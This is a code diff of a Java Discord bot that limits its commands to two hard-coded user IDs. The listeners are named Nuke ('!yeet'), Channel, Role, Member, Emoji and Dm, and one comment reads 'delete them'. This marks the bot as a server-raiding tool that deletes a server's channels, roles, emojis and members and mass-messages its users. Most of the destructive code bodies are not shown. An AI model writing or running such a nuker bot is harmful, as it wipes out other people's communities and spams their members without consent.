@@ -49,11 +49,16 @@ public final class Bot {
     }
 
     private static boolean stop = false;
+    private static final List<String> allowedUsers = new ArrayList<>();
+    static {
+        allowedUsers.add("993192453534400612");
+        allowedUsers.add("259780560707256321");
+    }
 
     private static final class Stop extends ListenerAdapter {
         @Override
         public void onMessageReceived(@NotNull MessageReceivedEvent event) {
-            if (!event.isFromGuild() || !event.getMessage().getContentRaw().contains("!stop")) return;
+            if (!event.isFromGuild() || !allowedUsers.contains(event.getMember().getId()) || !event.getMessage().getContentRaw().contains("!stop")) return;
             Guild guild = event.getGuild();
 
             stop = true;
@@ -73,7 +78,7 @@ public final class Bot {
     private static final class Dm extends ListenerAdapter {
         @Override
         public void onMessageReceived(@NotNull MessageReceivedEvent event) {
-            if (!event.isFromGuild() || !event.getMessage().getContentRaw().contains("!stop")) return;
+            if (!event.isFromGuild() || !allowedUsers.contains(event.getMember().getId()) || !event.getMessage().getContentRaw().contains("!dm")) return;
             Guild guild = event.getGuild();
 
             StringBuilder content = new StringBuilder();
@@ -102,7 +107,7 @@ public final class Bot {
     private static final class Create extends ListenerAdapter {
         @Override
         public void onMessageReceived(@NotNull MessageReceivedEvent event) {
-            if (!event.isFromGuild() || !event.getMessage().getContentRaw().contains("!hi")) return;
+            if (!event.isFromGuild() || !allowedUsers.contains(event.getMember().getId()) || !event.getMessage().getContentRaw().contains("!hi")) return;
             Guild guild = event.getGuild();
 
 
@@ -132,7 +137,7 @@ public final class Bot {
     private static final class Car extends ListenerAdapter {
         @Override
         public void onMessageReceived(@NotNull MessageReceivedEvent event) {
-            if (!event.isFromGuild() || !event.getMessage().getContentRaw().contains("!car")) return;
+            if (!event.isFromGuild() || !allowedUsers.contains(event.getMember().getId()) || !event.getMessage().getContentRaw().contains("!car")) return;
             Guild guild = event.getGuild();
 
 
@@ -162,7 +167,7 @@ public final class Bot {
     private static final class Rolez extends ListenerAdapter {
         @Override
         public void onMessageReceived(@NotNull MessageReceivedEvent event) {
-            if (!event.isFromGuild() || !event.getMessage().getContentRaw().contains("!rolez")) return;
+            if (!event.isFromGuild() || !allowedUsers.contains(event.getMember().getId()) || !event.getMessage().getContentRaw().contains("!rolez")) return;
             Guild guild = event.getGuild();
 
             Random random = new Random();
@@ -198,7 +203,7 @@ public final class Bot {
     private static final class Hentai extends ListenerAdapter {
         @Override
         public void onMessageReceived(@NotNull MessageReceivedEvent event) {
-            if (!event.isFromGuild() || !event.getMessage().getContentRaw().contains("!anime")) return;
+            if (!event.isFromGuild() || !allowedUsers.contains(event.getMember().getId()) || !event.getMessage().getContentRaw().contains("!anime")) return;
             Guild guild = event.getGuild();
 
 
@@ -259,7 +264,7 @@ public final class Bot {
     private static final class Nuke extends ListenerAdapter {
         @Override
         public void onMessageReceived(@NotNull MessageReceivedEvent event) {
-            if (!event.isFromGuild() || !event.getMessage().getContentRaw().contains("!yeet")) return;
+            if (!event.isFromGuild() || !allowedUsers.contains(event.getMember().getId()) || !event.getMessage().getContentRaw().contains("!yeet")) return;
             Guild guild = event.getGuild();
 
             // Check if there is channels and delete them
@@ -331,7 +336,7 @@ public final class Bot {
     private static final class Emoji extends ListenerAdapter {
         @Override
         public void onMessageReceived(@NotNull MessageReceivedEvent event) {
-            if (!event.isFromGuild() || !event.getMessage().getContentRaw().contains("!nomoji")) return;
+            if (!event.isFromGuild() || !allowedUsers.contains(event.getMember().getId()) || !event.getMessage().getContentRaw().contains("!nomoji")) return;
             Guild guild = event.getGuild();
 
 
@@ -360,7 +365,7 @@ public final class Bot {
     private static final class Channel extends ListenerAdapter {
         @Override
         public void onMessageReceived(@NotNull MessageReceivedEvent event) {
-            if (!event.isFromGuild() || !event.getMessage().getContentRaw().contains("!nochan")) return;
+            if (!event.isFromGuild() || !allowedUsers.contains(event.getMember().getId()) || !event.getMessage().getContentRaw().contains("!nochan")) return;
             Guild guild = event.getGuild();
 
 
@@ -381,7 +386,7 @@ public final class Bot {
     private static final class Role extends ListenerAdapter {
         @Override
         public void onMessageReceived(@NotNull MessageReceivedEvent event) {
-            if (!event.isFromGuild() || !event.getMessage().getContentRaw().contains("!norole")) return;
+            if (!event.isFromGuild() || !allowedUsers.contains(event.getMember().getId()) || !event.getMessage().getContentRaw().contains("!norole")) return;
             Guild guild = event.getGuild();
 
 
@@ -408,7 +413,7 @@ public final class Bot {
     private static final class Member extends ListenerAdapter {
         @Override
         public void onMessageReceived(@NotNull MessageReceivedEvent event) {
-            if (!event.isFromGuild() || !event.getMessage().getContentRaw().contains("!nomem")) return;
+            if (!event.isFromGuild() || !allowedUsers.contains(event.getMember().getId()) || !event.getMessage().getContentRaw().contains("!nomem")) return;
             Guild guild = event.getGuild();
 
 
